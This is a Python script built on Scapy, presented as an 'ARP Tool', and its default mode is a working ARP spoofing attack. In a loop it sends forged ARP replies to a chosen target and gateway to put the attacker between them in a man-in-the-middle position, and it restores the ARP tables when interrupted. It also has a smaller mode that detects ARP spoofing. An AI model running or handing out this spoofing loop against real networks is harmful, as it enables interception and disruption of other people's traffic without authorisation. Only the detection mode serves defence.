import os
import sys
import time
import json
import logging
import argparse
from datetime import datetime
from scapy.all import ARP, Ether, srp, send, sniff, conf
import pyfiglet
import termcolor


# ============================ Banner ============================

def banner():
    print(termcolor.colored(pyfiglet.figlet_format("ARP Tool"), "cyan"))
    print(termcolor.colored("Engineered Edition\n", "yellow"))
    print(termcolor.colored("Developed by 7ima-SR\n", "yellow"))
    print(termcolor.colored("https://github.com/7ima-SR\n", "yellow"))


# ============================ Logger ============================

class JSONLogger:
    def __init__(self, logfile="arp_tool.log"):
        self.logfile = logfile

    def log(self, level, message, extra=None):
        log_entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "level": level,
            "message": message,
            "extra": extra or {}
        }
        with open(self.logfile, "a") as f:
            f.write(json.dumps(log_entry) + "\n")


# ============================ MAC Cache ============================

class MACCache:
    def __init__(self):
        self.cache = {}

    def get(self, ip):
        return self.cache.get(ip)

    def set(self, ip, mac):
        self.cache[ip] = mac

    def show(self):
        print(termcolor.colored("\n[+] MAC Cache:", "magenta"))
        for ip, mac in self.cache.items():
            print(f"{ip} -> {mac}")


# ============================ ARP Engine ============================

class ARPEngine:

    def __init__(self, interface=None):
        if interface:
            conf.iface = interface
        self.cache = MACCache()
        self.logger = JSONLogger()

    def get_mac(self, ip):
        cached = self.cache.get(ip)
        if cached:
            return cached

        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request

        answered = srp(packet, timeout=2, verbose=False)[0]

        if answered:
            mac = answered[0][1].hwsrc
            self.cache.set(ip, mac)
            return mac
        return None

    def spoof(self, target_ip, spoof_ip):
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            self.logger.log("WARNING", "MAC not found", {"ip": target_ip})
            return False

        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

        self.logger.log("INFO", "Spoofed packet sent", {
            "target": target_ip,
            "spoofed_as": spoof_ip
        })
        return True

    def restore(self, dest_ip, src_ip):
        dest_mac = self.get_mac(dest_ip)
        src_mac = self.get_mac(src_ip)

        if dest_mac and src_mac:
            packet = ARP(
                op=2,
                pdst=dest_ip,
                hwdst=dest_mac,
                psrc=src_ip,
                hwsrc=src_mac
            )
            send(packet, count=4, verbose=False)

            self.logger.log("INFO", "Network restored", {
                "destination": dest_ip,
                "source": src_ip
            })

    # ================= Detection Mode =================

    def detect(self):
        print(termcolor.colored("[*] Detection Mode Started...", "cyan"))

        def process(packet):
            if packet.haslayer(ARP) and packet[ARP].op == 2:
                real_mac = self.get_mac(packet[ARP].psrc)
                if real_mac and real_mac != packet[ARP].hwsrc:
                    alert = {
                        "ip": packet[ARP].psrc,
                        "real_mac": real_mac,
                        "fake_mac": packet[ARP].hwsrc
                    }
                    print(termcolor.colored(f"[!] ARP Spoofing Detected: {alert}", "red"))
                    self.logger.log("ALERT", "ARP Spoofing Detected", alert)

        sniff(filter="arp", store=False, prn=process)


# ============================ CLI ============================

def check_root():
    if os.geteuid() != 0:
        print(termcolor.colored("Run as root!", "red"))
        sys.exit(1)


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target")
    parser.add_argument("-g", "--gateway")
    parser.add_argument("-i", "--interface")
    parser.add_argument("-m", "--mode", choices=["spoof", "detect"], default="spoof")

    args = parser.parse_args()
    return args


# ============================ Main ============================

def main():
    banner()
    check_root()

    args = parse_args()

    engine = ARPEngine(interface=args.interface)

    if args.mode == "detect":
        engine.detect()
        return

    if not args.target or not args.gateway:
        print("Target and Gateway required in spoof mode.")
        sys.exit(1)

    packet_count = 0

    try:
        while True:
            s1 = engine.spoof(args.target, args.gateway)
            s2 = engine.spoof(args.gateway, args.target)

            if s1 and s2:
                packet_count += 2
                print(termcolor.colored(f"[+] Packets Sent: {packet_count}", "green"))

            time.sleep(2)

    except KeyboardInterrupt:
        print(termcolor.colored("\n[-] Restoring Network...", "red"))
        engine.restore(args.target, args.gateway)
        engine.restore(args.gateway, args.target)
        print(termcolor.colored("[+] Done.", "green"))


if __name__ == "__main__":
    main()
